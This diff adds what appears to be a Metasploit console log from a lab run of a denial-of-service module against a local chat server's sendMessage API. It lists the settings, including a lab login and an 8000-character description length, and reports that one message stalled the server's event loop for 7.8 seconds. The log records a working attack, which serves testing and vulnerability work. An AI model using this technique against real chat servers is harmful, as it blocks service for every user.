@@ -1,0 +1,19 @@
+Loaded 1 modules:
+    1 auxiliary modules
+RHOSTS => 127.0.0.1
+RPORT => 39649
+TARGETURI => /api/v1/chat.sendMessage
+SSL => false
+VERBOSE => true
+USERNAME => alice
+PASSWORD => Al1ce-Lab-Pass!
+ROOMID => GENERAL
+DESCLEN => 8000
+[*] Running module against 127.0.0.1
+[*] 127.0.0.1:39649 - Signed in as alice (user id rSQxouLt89hux5j4J)
+[+] 127.0.0.1:39649 - VULN-026: exploited
+[+] 127.0.0.1:39649 - one message stalled the server for 7.8 s (baseline 0.047 s)
+[*]   the parse holds the Node event loop, so every other request waits the same time
+[+] 127.0.0.1:39649 - Saved the response to /tmp/.msf4/loot/20261124204252_default_127.0.0.1_blue_spider.vuln_853606.txt
+[*] Auxiliary module execution completed
+whoami: cannot find name for user ID 997
